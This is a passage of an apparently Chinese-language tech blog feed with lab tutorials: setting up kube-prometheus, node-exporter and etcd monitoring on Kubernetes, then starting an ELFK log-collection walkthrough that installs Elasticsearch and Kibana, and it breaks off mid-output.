image: registry.cn-hangzhou.aliyuncs.com/k8s/prometheus-adapter:v0.9.1<br>...<br><br>[root@master231 kube-prometheus-0.11.0]# vim manifests/kubeStateMetrics-deployment.yaml<br>...<br>        <span class="hljs-comment"># image: k8s.gcr.io/kube-state-metrics/kube-state-metrics:v2.5.0</span><br>        image: registry.cn-hangzhou.aliyuncs.com/k8s/kube-state-metrics:2.5.0<br>        <br>[root@master231 kube-prometheus-0.11.0]# vim manifests/grafana-service.yaml<br>....<br>spec:<br>  ...<br>  <span class="hljs-built_in">type</span>: NodePort<br>  ports:<br>  - name: http<br>    port: 3000<br>    targetPort: http<br>    nodePort: 30080<br>    <br>[root@master231 kube-prometheus-0.11.0]# vim manifests/prometheus-service.yaml<br>....<br>spec:<br>  <span class="hljs-built_in">type</span>: NodePort<br>  ports:<br>  - name: web<br>    port: 9090<br>    targetPort: web<br>    nodePort: 30090<br>    <br>部署服务<br>[root@master231 kube-prometheus-0.11.0]# kubectl apply --server-side -f manifests/setup<br>[root@master231 kube-prometheus-0.11.0]# kubectl <span class="hljs-built_in">wait</span> \<br>--<span class="hljs-keyword">for</span> condition=Established \<br>--all CustomResourceDefinition \<br>--namespace=monitoring<br>[root@master231 kube-prometheus-0.11.0]# kubectl apply -f manifests/<br><br>查看对应的Pod运行列表 ------&gt;如果没运行起来，一般手动导入镜像到对应节点<br>[root@master231 kube-prometheus-0.11.0]# kubectl get pods -n monitoring  -o wide<br>删除镜像，重新拉取<br>[root@master231 kube-prometheus-0.11.0]# kubectl -n monitoring delete pod --all<br>查看pod事件信息<br>[root@master231 kube-prometheus-0.11.0]# kubectl -n monitoring describe prometheus-k8s-0<br>查看所有服务<br>[root@master231 kube-prometheus-0.11.0]# kubectl get svc -A<br>查看svc详情<br>[root@master231 kube-prometheus-0.11.0]# kubectl describe svc -n monitoring prometheus-k8s<br><br>修改收件人和发件人信息<br>[root@master231 kube-prometheus-0.11.0]# vim manifests/alertmanager-secret.yaml <br>里面记录了alertmanager的收件人和发件人信息。<br><br>访问WebUI <br>grafana：账号密码admin<br>http://10.0.0.231:30080<br>------------------------------<br>普罗米修斯：<br>http://10.0.0.231:30090<br>------------------------------<br><br>查看内置的模板 <br>查看后再倒入1860模板对比测试。<br></code></pre></td></tr></table></figure><h4 id="2-prometheus外部监控k8s集群"><a href="#2-prometheus外部监控k8s集群" class="headerlink" title="2.prometheus外部监控k8s集群"></a>2.prometheus外部监控k8s集群</h4><h5 id="监控node-exporter节点"><a href="#监控node-exporter节点" class="headerlink" title="监控node-exporter节点"></a><strong>监控node-exporter节点</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.所有节点导入镜像<br>[root@master231 ~]# docker load -i node-exporter_v1.8.1.tar.gz<br><br>2.在k8smaster编写资源清单<br>[root@master231 ~]# <span class="hljs-built_in">cat</span> ds-node-exporter.yaml <br>apiVersion: apps/v1<br>kind: DaemonSet<br>metadata:<br>  name: ds-node-exporter<br>spec:<br>  selector:<br>    matchLabels:<br>      apps: node-exporter<br>  template:<br>    metadata:<br>      labels:<br>        apps: node-exporter<br>    spec:<br>      hostNetwork: <span class="hljs-literal">true</span><br>      tolerations:<br>      - key: node-role.kubernetes.io/master<br>        effect: NoSchedule<br>      containers:<br>      - name: node-exporter<br>        image: prom/node-exporter:v1.8.1<br>        <span class="hljs-built_in">command</span>:<br>        - /bin/node_exporter<br>        - --web.listen-address=:19100<br><br>3.查看pod ---&gt; 每个节点成功运行<br>[root@master231 ~]# kubectl get pods -o wide<br>NAME                     READY   STATUS        RESTARTS   AGE    IP           NODE      <br>ds-node-exporter-5b4gc   1/1     Running       0          35s    10.0.0.233   worker233 <br>ds-node-exporter-dmnnj   1/1     Running       0          35s    10.0.0.232   worker232 <br>ds-node-exporter-hpj9h   1/1     Running       0          35s    10.0.0.231   master231 <br><br>4.修改Prometheus的配置文件并重新加载<br>[root@prometheus-server31 ~]# vim /softwares/prometheus-2.53.2.linux-amd64/prometheus.yml <br>...<br>  - job_name: k8s-node-exporter<br>    static_configs:<br>    - targets:<br>      - 10.0.0.231:19100<br>      - 10.0.0.232:19100<br>      - 10.0.0.233:19100<br>      <br>4.访问Prometheus的WebUI<br>http://10.0.0.31:9090/targets<br><br>5.grafana采集普罗米修斯31数据源的信息，导入模板ID<br>1860<br><br></code></pre></td></tr></table></figure><h5 id="监控云原生应用etcd案例"><a href="#监控云原生应用etcd案例" class="headerlink" title="监控云原生应用etcd案例"></a><strong>监控云原生应用etcd案例</strong></h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs bash">1.查看etcd证书存储路径<br>[root@master231 ~]#  egrep <span class="hljs-string">&quot;\--key-file|--cert-file&quot;</span> /etc/kubernetes/manifests/etcd.yaml <br>    - --cert-file=/etc/kubernetes/pki/etcd/server.crt<br>    - --key-file=/etc/kubernetes/pki/etcd/server.key<br><br>2 测试etcd证书访问的metrics接口<br>[root@master231 ~]# curl -s --cert /etc/kubernetes/pki/etcd/server.crt  --key /etc/kubernetes/pki/etcd/server.key https://10.0.0.231:2379/metrics -k | <span class="hljs-built_in">tail</span><br><br>3. 创建etcd的service<br>[root@master231 ~]# <span class="hljs-built_in">cat</span> etcd-svc.yaml <br>apiVersion: v1<br>kind: Endpoints<br>metadata:<br>  name: etcd-k8s<br>  namespace:  kube-system<br>subsets:<br>- addresses:<br>  - ip: 10.0.0.231<br>  ports:<br>  - name: https-metrics<br>    port: 2379<br>    protocol: TCP<br><br>---<br><br>apiVersion: v1<br>kind: Service<br>metadata:<br>  name: etcd-k8s<br>  namespace: kube-system<br>  labels:<br>    apps: etcd<br>spec:<br>  ports:<br>  - name: https-metrics<br>    port: 2379<br>    targetPort: 2379<br>  <span class="hljs-built_in">type</span>: ClusterIP<br>  <br>[root@master231 ~]# kubectl apply -f etcd-svc.yaml<br>[root@master231 ~]# kubectl get svc -n kube-system -l apps=etcd<br>NAME       TYPE        CLUSTER-IP      EXTERNAL-IP   PORT(S)    AGE<br>etcd-k8s   ClusterIP   10.200.33.157   &lt;none&gt;        2379/TCP   36m<br>[root@master231 ~]# <br>[root@master231 ~]# kubectl -n kube-system describe svc etcd-k8s  | grep Endpoints<br>Endpoints:         10.0.0.231:2379<br><br><br>3.基于创建的svc访问测试连通性<br>[root@master231 ~]# curl -s --cert /etc/kubernetes/pki/etcd/server.crt  --key /etc/kubernetes/pki/etcd/server.key https://10.200.33.157:2379/metrics -k | <span class="hljs-built_in">tail</span> -1 <br>promhttp_metric_handler_requests_total&#123;code=<span class="hljs-string">&quot;503&quot;</span>&#125; 0<br><br>4.创建etcd证书的secrets并挂载到Prometheus server<br>4.1 查找需要挂载etcd的证书文件路径<br>[root@master231 ~]# egrep <span class="hljs-string">&quot;\--key-file|--cert-file|--trusted-ca-file&quot;</span> /etc/kubernetes/manifests/etcd.yaml   <br>    - --cert-file=/etc/kubernetes/pki/etcd/server.crt<br>    - --key-file=/etc/kubernetes/pki/etcd/server.key<br>    - --trusted-ca-file=/etc/kubernetes/pki/etcd/ca.crt<br>[root@master231 ~]# <br><br><br>4.2 根据etcd的实际存储路径创建secrets<br>[root@master231 ~]# kubectl create secret generic etcd-tls --from-file=/etc/kubernetes/pki/etcd/server.crt --from-file=/etc/kubernetes/pki/etcd/server.key  --from-file=/etc/kubernetes/pki/etcd/ca.crt -n monitoring <br>secret/etcd-tls created<br>[root@master231 ~]# <br>[root@master231 ~]# kubectl -n monitoring get secrets etcd-tls <br>NAME       TYPE     DATA   AGE<br>etcd-tls   Opaque   3      12s<br>[root@master231 ~]# <br><br><br>4.3 修改Prometheus的资源，修改后会自动重启<br>[root@master231 ~]# kubectl -n monitoring edit prometheus k8s<br>...<br>spec:<br>  secrets:<br>  - etcd-tls<br>  ...  <br>[root@master231 ~]# kubectl -n monitoring get pods -l app.kubernetes.io/component=prometheus -o wide<br>NAME               READY   STATUS    RESTARTS   AGE   IP            NODE        NOMINATED NODE   READINESS GATES<br>prometheus-k8s-0   2/2     Running   0          74s   10.100.1.57   worker232   &lt;none&gt;           &lt;none&gt;<br>prometheus-k8s-1   2/2     Running   0          92s   10.100.2.28   worker233   &lt;none&gt;           &lt;none&gt;<br>[root@master231 ~]# <br><br><br>4.4 查看证书是否挂载成功<br>[root@master231 ~]# kubectl -n monitoring <span class="hljs-built_in">exec</span> prometheus-k8s-0 -c prometheus -- <span class="hljs-built_in">ls</span> -l /etc/prometheus/secrets/etcd-tls<br>total 0<br>lrwxrwxrwx    1 root     2000            13 Jan 24 14:07 ca.crt -&gt; ..data/ca.crt<br>lrwxrwxrwx    1 root     2000            17 Jan 24 14:07 server.crt -&gt; ..data/server.crt<br>lrwxrwxrwx    1 root     2000            17 Jan 24 14:07 server.key -&gt; ..data/server.key<br>[root@master231 ~]# <br>[root@master231 ~]# kubectl -n monitoring <span class="hljs-built_in">exec</span> prometheus-k8s-1 -c prometheus -- <span class="hljs-built_in">ls</span> -l /etc/prometheus/secrets/etcd-tls<br>total 0<br>lrwxrwxrwx    1 root     2000            13 Jan 24 14:07 ca.crt -&gt; ..data/ca.crt<br>lrwxrwxrwx    1 root     2000            17 Jan 24 14:07 server.crt -&gt; ..data/server.crt<br>lrwxrwxrwx    1 root     2000            17 Jan 24 14:07 server.key -&gt; ..data/server.key<br>[root@master231 ~]# <br><br><br>5.创建ServerMonitor<br>5.1 创建ServiceMonitor资源关联etcd的svc<br>[root@master231 ~]# <span class="hljs-built_in">cat</span>  etcd-smon.yaml <br>apiVersion: monitoring.coreos.com/v1<br>kind: ServiceMonitor<br>metadata:<br>  name: etcd-smon<br>  namespace: monitoring<br>spec:<br>  <span class="hljs-comment"># 指定job的标签，可以不设置。</span><br>  jobLabel: kubeadm-etcd-k8s<br>  <span class="hljs-comment"># 指定监控后端目标的策略</span><br>  endpoints:<br>    <span class="hljs-comment"># 监控数据抓取的时间间隔</span><br>  - interval: 30s<br>    <span class="hljs-comment"># 指定metrics端口，这个port对应Services.spec.ports.name</span><br>    port: https-metrics<br>    <span class="hljs-comment"># Metrics接口路径</span><br>    path: /metrics<br>    <span class="hljs-comment"># Metrics接口的协议</span><br>    scheme: https<br>    <span class="hljs-comment"># 指定用于连接etcd的证书文件</span><br>    tlsConfig:<br>      <span class="hljs-comment"># 指定etcd的CA的证书文件</span><br>      caFile:  /etc/prometheus/secrets/etcd-tls/ca.crt<br>      <span class="hljs-comment"># 指定etcd的证书文件</span><br>      certFile: /etc/prometheus/secrets/etcd-tls/server.crt<br>      <span class="hljs-comment"># 指定etcd的私钥文件</span><br>      keyFile: /etc/prometheus/secrets/etcd-tls/server.key<br>      <span class="hljs-comment"># 关闭证书校验，毕竟咱们是自建的证书，而非官方授权的证书文件。</span><br>      insecureSkipVerify: <span class="hljs-literal">true</span><br>  <span class="hljs-comment"># 监控目标Service所在的命名空间</span><br>  namespaceSelector:<br>    matchNames:<br>    - kube-system<br>  <span class="hljs-comment"># 监控目标Service目标的标签。</span><br>  selector:<br>    <span class="hljs-comment"># 注意，这个标签要和etcd的service的标签保持一致哟</span><br>    matchLabels:<br>      apps: etcd<br>[root@master231 ~]# <br>[root@master231 ~]# kubectl apply -f etcd-smon.yaml <br>servicemonitor.monitoring.coreos.com/etcd-smon created<br>[root@master231 ~]# <br>[root@master231 ~]# kubectl get smon -n monitoring yinzhengjie-etcd-smon <br>NAME                    AGE<br>yinzhengjie-etcd-smon   8s<br>[root@master231 ~]# <br><br><br>5.2.访问Prometheus的WebUI<br>http://10.0.0.233:30090/targets?search=<br><br><br>6.查看etcd的数据<br>etcd_cluster_version<br><br>7.使用grafana查看etcd数据<br>http://10.0.0.233:30080/?orgId=1<br>3070<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>监控篇</category>
      
    </categories>
    
    
    <tags>
      
      <tag>监控篇</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ELFK日志采集实战</title>
    <link href="/2025/04/16/ELFK%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86%E5%AE%9E%E6%88%98/"/>
    <url>/2025/04/16/ELFK%E6%97%A5%E5%BF%97%E9%87%87%E9%9B%86%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="一、日志分析概述"><a href="#一、日志分析概述" class="headerlink" title="一、日志分析概述"></a>一、日志分析概述</h1><ul><li>日志分析是运维工程师解决系统故障，发现问题的主要手段</li><li>日志主要包括系统日志、应用程序日志和安全日志</li><li>系统运维和开发人员可以通过日志了解服务器软硬件信息、检查配置过程中的错误及错误发生的原因</li><li>经常分析日志可以了解服务器的负荷，性能安全性，从而及时采取措施纠正错误</li></ul><h1 id="二、日志分析的作用"><a href="#二、日志分析的作用" class="headerlink" title="二、日志分析的作用"></a>二、日志分析的作用</h1><ul><li>分析日志时刻监控系统运行的状态</li><li>分析日志来定位程序的bug</li><li>分析日志监控网站的访问流量</li><li>分析日志可以知道哪些sql语句需要优化</li></ul><h1 id="三、ELK概述"><a href="#三、ELK概述" class="headerlink" title="三、ELK概述"></a>三、ELK概述</h1><p>ELFK 已经成为目前最流行的集中式日志解决方案，它主要是由 filebeat、Logstash、Elasticsearch、Kibana 等组件组成，来共同完成实时日志的收集，存储，展示等一站式的解决方案。本文将会介绍 ELK 常见的架构以及相关问题解决。</p><ul><li>Filebeat：Filebeat 是一款轻量级，占用服务资源非常少的数据收集引擎，它是 ELK 家族的新成员，可以代替 Logstash 作为在应用服务器端的日志收集引擎，支持将收集到的数据输出到 Kafka，Redis 等队列。</li><li>Logstash：数据收集引擎，相较于 Filebeat 比较重量级，但它集成了大量的插件，支持丰富的数据源收集，对收集的数据可以过滤，分析，格式化日志格式。</li><li>Elasticsearch：分布式数据搜索引擎，基于 Apache Lucene 实现，可集群，提供数据的集中式存储，分析，以及强大的数据搜索和聚合功能。</li><li>Kibana：数据的可视化平台，通过该 web 平台可以实时的查看 Elasticsearch 中的相关数据，并提供了丰富的图表统计功能</li></ul><h1 id="四、日志采集常见部署架构"><a href="#四、日志采集常见部署架构" class="headerlink" title="四、日志采集常见部署架构"></a>四、日志采集常见部署架构</h1><p><strong>filebeat作为日志收集器</strong></p><p>使用 Filebeat 作为日志采集器，通常可以将其直接作为日志收集的前端组件，负责读取日志文件并发送到后续Elasticsearch 中。之后kabana做出图展示。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/2b05ddcb77964793a6825be117a9af44.png" alt="2b05ddcb77964793a6825be117a9af44.png"></p><p><strong>引入缓存队列的部署架构</strong></p><p>该架构在第二种架构的基础上引入了 Kafka 消息队列（还可以是其他消息队列），将 Filebeat 收集到的数据发送至 Kafka，然后在通过 Logstasth 读取 Kafka 中的数据，这种架构主要是解决大数据量下的日志收集方案，使用缓存队列主要是解决数据安全与均衡 Logstash 与 Elasticsearch 负载压力。</p><p><img src="https://gitee.com/ljh00928/csdn/raw/master/img/d0372a55a98241e1a77a402e5a7bd5d5.png" alt="d0372a55a98241e1a77a402e5a7bd5d5.png"></p><blockquote><p>本次我们部署efk架构。filebeat作为日志采集器，Elasticsearch存储数据，kibana展示采集的数据。</p></blockquote><h3 id="部署-Elasticsearch"><a href="#部署-Elasticsearch" class="headerlink" title="部署 Elasticsearch"></a><strong>部署 Elasticsearch</strong></h3><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-number">1.</span>下载软件包<br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.17.22-amd64.deb</span><br><br><span class="hljs-number">2.</span>安装<br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># dpkg -i elasticsearch-7.17.22-amd64.deb</span><br><br><span class="hljs-number">3.</span>修改配置文件<br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># vim /etc/elasticsearch/elasticsearch.yml </span><br>cluster.name: cherry<br>path.data: /var/lib/elasticsearch<br>path.logs: /var/<span class="hljs-built_in">log</span>/elasticsearch<br>network.host: <span class="hljs-number">0.0</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span><br>http.port: <span class="hljs-number">9200</span><br>transport.port: <span class="hljs-number">9300</span><br>discovery.type: <span class="hljs-string">&quot;single-node&quot;</span><br><br><span class="hljs-number">4.</span>启动服务<br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># systemctl enable --now elasticsearch.service</span><br>Synchronizing state of elasticsearch.service <span class="hljs-keyword">with</span> SysV service script <span class="hljs-keyword">with</span> /usr/lib/systemd/systemd-sysv-install.<br>Executing: /usr/lib/systemd/systemd-sysv-install enable elasticsearch<br>Created symlink /etc/systemd/system/multi-user.target.wants/elasticsearch.service → /usr/lib/systemd/system/elasticsearch.service.<br><br><span class="hljs-number">5.</span>查看端口验证服务是否启动成功<br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># ss -ntl | grep <span class="hljs-string">&quot;9[2|3]00&quot;</span></span><br>LISTEN <span class="hljs-number">0</span>      <span class="hljs-number">65535</span>              *:<span class="hljs-number">9300</span>             *:*          <br>LISTEN <span class="hljs-number">0</span>      <span class="hljs-number">65535</span>              *:<span class="hljs-number">9200</span>             *:*  <br><br><span class="hljs-number">6.</span>访问<br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># curl http://192.1.7.244:9200/</span><br>&#123;<br>  <span class="hljs-string">&quot;name&quot;</span> : <span class="hljs-string">&quot;node1.local&quot;</span>,<br>  <span class="hljs-string">&quot;cluster_name&quot;</span> : <span class="hljs-string">&quot;cherry&quot;</span>,<br>  <span class="hljs-string">&quot;cluster_uuid&quot;</span> : <span class="hljs-string">&quot;1-AfkL1DRXKIMuhaQuoFLQ&quot;</span>,<br>  <span class="hljs-string">&quot;version&quot;</span> : &#123;<br>    <span class="hljs-string">&quot;number&quot;</span> : <span class="hljs-string">&quot;7.17.22&quot;</span>,<br>    <span class="hljs-string">&quot;build_flavor&quot;</span> : <span class="hljs-string">&quot;default&quot;</span>,<br>    <span class="hljs-string">&quot;build_type&quot;</span> : <span class="hljs-string">&quot;deb&quot;</span>,<br>    <span class="hljs-string">&quot;build_hash&quot;</span> : <span class="hljs-string">&quot;38e9ca2e81304a821c50862dafab089ca863944b&quot;</span>,<br>    <span class="hljs-string">&quot;build_date&quot;</span> : <span class="hljs-string">&quot;2024-06-06T07:35:17.876121680Z&quot;</span>,<br>    <span class="hljs-string">&quot;build_snapshot&quot;</span> : <span class="hljs-literal">false</span>,<br>    <span class="hljs-string">&quot;lucene_version&quot;</span> : <span class="hljs-string">&quot;8.11.3&quot;</span>,<br>    <span class="hljs-string">&quot;minimum_wire_compatibility_version&quot;</span> : <span class="hljs-string">&quot;6.8.0&quot;</span>,<br>    <span class="hljs-string">&quot;minimum_index_compatibility_version&quot;</span> : <span class="hljs-string">&quot;6.0.0-beta1&quot;</span><br>  &#125;,<br>  <span class="hljs-string">&quot;tagline&quot;</span> : <span class="hljs-string">&quot;You Know, for Search&quot;</span><br>&#125;<br><br><span class="hljs-number">7.</span>查看节点信息<br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># curl 192.1.7.244:9200/_cat/nodes</span><br><span class="hljs-number">192.1</span><span class="hljs-number">.7</span><span class="hljs-number">.244</span> <span class="hljs-number">18</span> <span class="hljs-number">99</span> <span class="hljs-number">2</span> <span class="hljs-number">0.05</span> <span class="hljs-number">0.15</span> <span class="hljs-number">0.07</span> cdfhilmrstw * node1.<span class="hljs-keyword">local</span><br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta">#</span><br>[root<span class="hljs-symbol">@node1</span>.<span class="hljs-keyword">local</span> ~]<span class="hljs-meta"># curl 192.1.7.244:9200/_cat/nodes?v</span><br>ip          heap.percent ram.percent cpu load_1m load_5m load_15m node.role   master name<br><span class="hljs-number">192.1</span><span class="hljs-number">.7</span><span class="hljs-number">.244</span>           <span class="hljs-number">18</span>          <span class="hljs-number">99</span>   <span class="hljs-number">0</span>    <span class="hljs-number">0.04</span>    <span class="hljs-number">0.14</span>     <span class="hljs-number">0.07</span> cdfhilmrstw *      node1.<span class="hljs-keyword">local</span><br></code></pre></td></tr></table></figure><h3 id="部署kibana"><a href="#部署kibana" class="headerlink" title="部署kibana"></a>部署kibana</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs nix"><span class="hljs-number">1</span>.下载kibana<br>[root@node1.local ~]<span class="hljs-comment"># wget https://artifacts.elastic.co/downloads/kibana/kibana-7.17.22-amd64.deb</span><br><br><span class="hljs-number">2</span>.安装<br>[root@node1.local ~]<span class="hljs-comment"># dpkg -i kibana-7.17.22-amd64.deb</span><br><br><span class="hljs-number">3</span>.修改配置文件<br>[root@node1.local ~]<span class="hljs-comment"># vim /etc/kibana/kibana.yml</span><br>...<br><span class="hljs-comment"># 监听的端口</span><br>server.<span class="hljs-params">port:</span> <span class="hljs-number">5601</span><br><span class="hljs-comment"># 监听的地址</span><br>server.<span class="hljs-params">host:</span> <span class="hljs-string">&quot;0.0.0.0&quot;</span><br><span class="hljs-comment"># 指定ES集群地址</span><br>elasticsearch.<span class="hljs-params">hosts:</span> [<span class="hljs-string">&quot;http://192.1.7.244:9200&quot;</span>]<br><span class="hljs-comment"># 国际化语言</span><br>i18n.<span class="hljs-params">locale:</span> <span class="hljs-string">&quot;zh-CN&quot;</span><br><br><span class="hljs-number">4</span>.启动<br>[root@node1.local ~]<span class="hljs-comment"># systemctl enable --now kibana.service</span><br>[root@node1.local ~]<span class="hljs-comment"># ss -ntl | grep 5601</span><br>LISTEN <span class="hljs-number">0</span>      <span class="hljs-number">511</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">5601</span>      <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-operator">*</span> <br><br><span class="hljs-number">5</span>.访问<br>[root@node1.local ~]<span class="hljs-comment"># curl -I http://192.1.7.244:5601</span><br>HTTP<span class="hljs-symbol">/1.1</span> <span class="hljs-number">302</span> Found<br><span class="hljs-params">location:</span> <span class="hljs-symbol">/spaces/enter</span><br><span class="hljs-params">x-content-type-options:</span> nosniff<br><span class="hljs-params">referrer-policy:</span> no-referrer-when-downgrade<br><span class="hljs-params">content-security-policy:</span> script-src &#x27;unsafe-eval&#x27; &#x27;self&#x27;; worker-src <span class="hljs-params">blob:</span> &#x27;self&#x27;; style-src &#x27;unsafe-inline&#x27; &#x27;self&#x27;<br><span class="hljs-params">kbn-name:</span> node1.local<br><span class="hljs-params">kbn-license-sig:</span> f4384e4807b75451c2f4feacc4d54e13f9397d4b4f115c922f956f9017453f91<br><span class="hljs-params">cache-control:</span> private, no-cache, 